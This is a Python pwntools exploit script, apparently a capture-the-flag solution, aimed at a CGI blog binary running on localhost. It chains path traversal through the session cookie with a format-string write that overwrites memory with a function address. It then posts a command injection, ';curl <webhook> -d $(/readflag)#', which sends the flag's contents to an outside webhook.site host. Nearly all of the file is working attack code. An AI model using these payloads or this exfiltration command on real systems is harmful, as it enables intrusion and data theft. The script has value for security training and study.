#!/usr/bin/env python3
from pwn import *
import http.client
import requests
import urllib.parse

# =========================================================
#                          SETUP                         
# =========================================================
exe = './main.cgi_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'localhost', 8000

def initialize(env, argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, env=env)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# break *main

# session_read
# break *0x402a20

# cmp admin
# break *0x4027e2

# query strings
# break *0x401fb9
# break *0x401fdf

# first snprintf
# break *0x401bbd

# second snprintf
break *0x401cd0

# third snprintf
# break *0x401dea

set follow-fork-mode parent
break *count_files_in_dir
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit_via_cgi():
    global io

    with open("./posts/tag/34a395a8-a225-4af4-86dd-95d886040ecf.tag", "wb") as f:
        payload = p64(elf.sym['count_files_in_dir'])
        f.write(payload)

    env = {
        'PATH_INFO': '/view',
        'REQUEST_METHOD': 'GET',
        'HTTP_COOKIE': 'session=../posts/content/0c41e339-9390-4ab2-926a-5b3e1dc1feb4.content',
        'QUERY_STRING': 'post=34a395a8-a225-4af4-86dd-95d886040ecf',
    }
    io = initialize(env=env)

    io.interactive()

def exploit_via_web():
    path = "/cgi-bin/main.cgi/upload"
    full_url = f"http://{host}:{port}{path}"
    WEBHOOK = 'https://webhook.site/f2a040d5-6ae8-465f-ac1c-4b9f2938964f'

    data = {
        'title': b'%4217694c%16$lnaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
        'tags': p64(elf.sym['count_files_in_dir']),
        'content': b'34a395a8-a225-4af4-86dd-95d886040ecf'
    }
    encoded_body = urllib.parse.urlencode(data)

    headers = {
        "Host": f"{host}:{port}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(encoded_body)),
        "Origin": f"http://{host}:{port}",
        "Connection": "keep-alive",
        "Referer": f"http://{host}:{port}/cgi-bin/main.cgi/upload",
        "Cookie": "session=../posts/author/9a437947-455d-49d8-beba-f8b1c27ca65d.author",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i"
    }

    conn = http.client.HTTPConnection(host, port)
    conn.request("POST", full_url, body=encoded_body, headers=headers)
    print("Sending request to:", full_url)
    response = conn.getresponse()
    print("Status:", response.status)
    print("Reason:", response.reason)
    print("Body:\n", response.read())
    conn.close()

    resp = requests.post(full_url, data={
        'title': b'test',
        'tags': b'test',
        'content': f';curl {WEBHOOK} -d $(/readflag)#'.encode()
    }, headers={
        'Cookie': 'session=../posts/author/9a437947-455d-49d8-beba-f8b1c27ca65d.author',
    })

    command_injection_post_id = resp.text.split("post=")[1].split('"')[0]
    
    path = "/cgi-bin/main.cgi/view"
    full_url = f"http://{host}:{port}{path}"
    for i in range(10):
        requests.get(full_url, headers={
            'Cookie': f'session=../posts/content/{command_injection_post_id}.content',
        })

if __name__ == '__main__':
    # exploit_via_cgi() # for debugging via gdb
    exploit_via_web()
